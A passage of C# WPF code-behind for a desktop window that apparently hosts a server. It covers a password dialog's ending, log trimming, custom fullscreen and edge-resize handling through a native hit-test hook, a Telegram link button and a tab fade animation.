        string? result = null;
        btn.Click += (_, _) => { result = tb.Password; dlg.DialogResult = true; };
        sp.Children.Add(btn);
        dlg.Content = sp;
        tb.Focus();
        return dlg.ShowDialog() == true ? result : null;
    }

    // ── Logging ─────────────────────────────────────

    private void Log(string msg)
    {
        var entry = $"[{DateTime.Now:HH:mm:ss}] {msg}\n";
        _logLineCount++;

        if (_logLineCount > LogMaxLines)
        {
            // Trim: read current text (O(n) but happens only every ~1000 lines),
            // skip past the first LogTrimTo lines, rebuild.
            var current = TxtLogs.Text;
            int pos = 0, line = 0;
            while (pos < current.Length && line < LogTrimTo) { if (current[pos++] == '\n') line++; }
            TxtLogs.Text = "[...older logs trimmed...]\n" + (pos < current.Length ? current[pos..] : "") + entry;
            _logLineCount = LogTrimTo + 1;
        }
        else
        {
            // Inlines.Add is O(1) — avoids re-allocating the entire string on every append.
            // TxtLogs.Text += was O(n) and froze the UI under high client load.
            TxtLogs.Inlines.Add(new System.Windows.Documents.Run(entry));
        }

        LogScroller?.ScrollToEnd();
    }

    // ── Window Controls ─────────────────────────────

    private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && !_isFullscreen && WindowState != WindowState.Maximized)
            DragMove();
    }

    protected override void OnStateChanged(EventArgs e)
    {
        base.OnStateChanged(e);
        if (WindowState == WindowState.Normal && _isFullscreen)
            _isFullscreen = false;
        bool big = WindowState == WindowState.Maximized || _isFullscreen;
        BtnFullscreen.Content = big ? "❐" : "☐";
        // Remove corner radius when filling the screen to avoid rounded black corners
        if (RootBorder != null)
            RootBorder.CornerRadius = WindowState == WindowState.Maximized
                ? new CornerRadius(0)
                : new CornerRadius(8);
    }

    private void Minimize_Click(object sender, RoutedEventArgs e) => WindowState = WindowState.Minimized;

    private WindowState _stateBeforeFullscreen;
    private double _widthBefore, _heightBefore, _leftBefore, _topBefore;
    private bool _isFullscreen;

    private void Fullscreen_Click(object sender, RoutedEventArgs e)
    {
        if (WindowState == WindowState.Maximized)
        {
            // OS-maximized (e.g. Win+↑ or Win+Ctrl+S) — just restore to Normal
            WindowState = WindowState.Normal;
            RootBorder.CornerRadius = new CornerRadius(8);
        }
        else if (_isFullscreen)
        {
            // Restore from our custom WorkArea fill
            _isFullscreen = false;
            WindowState = _stateBeforeFullscreen;
            Width  = _widthBefore;
            Height = _heightBefore;
            Left   = _leftBefore;
            Top    = _topBefore;
            RootBorder.CornerRadius = new CornerRadius(8);
        }
        else
        {
            // Save and fill WorkArea (keeps taskbar, no corner issues)
            _stateBeforeFullscreen = WindowState;
            _widthBefore  = Width;
            _heightBefore = Height;
            _leftBefore   = Left;
            _topBefore    = Top;
            WindowState = WindowState.Normal;
            var area = SystemParameters.WorkArea;
            Left   = area.Left;
            Top    = area.Top;
            Width  = area.Width;
            Height = area.Height;
            _isFullscreen = true;
            RootBorder.CornerRadius = new CornerRadius(0);
        }
    }

    // ── Native edge/corner resize via WM_NCHITTEST ──────────────────────────
    // Lets the OS handle resize — no visible grip needed.

    protected override void OnSourceInitialized(EventArgs e)
    {
        base.OnSourceInitialized(e);
        var src = System.Windows.Interop.HwndSource.FromHwnd(
            new System.Windows.Interop.WindowInteropHelper(this).Handle);
        src?.AddHook(NcHitTest);
    }

    private System.Windows.Media.Effects.DropShadowEffect? _savedShadow;
    private bool _resizing;

    private nint NcHitTest(nint hwnd, int msg, nint wParam, nint lParam, ref bool handled)
    {
        const int WM_NCHITTEST    = 0x0084;
        const int WM_ENTERSIZEMOVE = 0x0231;
        const int WM_EXITSIZEMOVE  = 0x0232;

        // Disable expensive effects while user drags — huge perf win with AllowsTransparency
        if (msg == WM_ENTERSIZEMOVE && !_resizing)
        {
            _resizing = true;
            _savedShadow = RootBorder.Effect as System.Windows.Media.Effects.DropShadowEffect;
            RootBorder.Effect = null;
            if (BgLogoBlur != null) BgLogoBlur.Radius = 0;
            handled = false; return nint.Zero;
        }
        if (msg == WM_EXITSIZEMOVE && _resizing)
        {
            _resizing = false;
            RootBorder.Effect = _savedShadow;
            if (BgLogoBlur != null) BgLogoBlur.Radius = 2;
            handled = false; return nint.Zero;
        }

        if (msg != WM_NCHITTEST || _isFullscreen || WindowState == WindowState.Maximized)
            return nint.Zero;

        int x = unchecked((short)(lParam.ToInt64() & 0xFFFF));
        int y = unchecked((short)((lParam.ToInt64() >> 16) & 0xFFFF));

        var dpi  = VisualTreeHelper.GetDpi(this);
        double l = Left   * dpi.DpiScaleX;
        double t = Top    * dpi.DpiScaleY;
        double r = (Left + Width)  * dpi.DpiScaleX;
        double b = (Top  + Height) * dpi.DpiScaleY;
        const double g = 8; // grip thickness in physical pixels

        bool atL = x < l + g, atR = x > r - g, atT = y < t + g, atB = y > b - g;

        if (atB && atR) { handled = true; return (nint)17; } // HTBOTTOMRIGHT
        if (atB && atL) { handled = true; return (nint)16; } // HTBOTTOMLEFT
        if (atT && atR) { handled = true; return (nint)14; } // HTTOPRIGHT
        if (atT && atL) { handled = true; return (nint)13; } // HTTOPLEFT
        if (atB)        { handled = true; return (nint)15; } // HTBOTTOM
        if (atR)        { handled = true; return (nint)11; } // HTRIGHT
        if (atL)        { handled = true; return (nint)10; } // HTLEFT
        if (atT)        { handled = true; return (nint)12; } // HTTOP
        return nint.Zero;
    }

    private void Close_Click(object sender, RoutedEventArgs e)
    {
        _server?.Stop();
        Application.Current.Shutdown();
    }

    private void TelegramLink_Click(object sender, RoutedEventArgs e)
    {
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
        {
            FileName = "https://t.me/serotohnine",
            UseShellExecute = true
        });
    }

    private void MainTabControl_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (!ReferenceEquals(e.OriginalSource, MainTabControl)) return;
        if (e.AddedItems.Count == 0) return;

        var presenter = MainTabControl.Template?.FindName("PART_SelectedContentHost", MainTabControl) as ContentPresenter;
        if (presenter == null) return;

        // Fade-in only — BlurEffect removed: WPF BlurEffect uses DirectX pixel shaders that
        // cause colored rendering artifacts in Hyper-V (synthetic display adapter doesn't
        // support the intermediate render targets WPF bitmap effects require).
        var ease = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut };
        presenter.BeginAnimation(OpacityProperty,
            new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(220)) { EasingFunction = ease });
    }
}
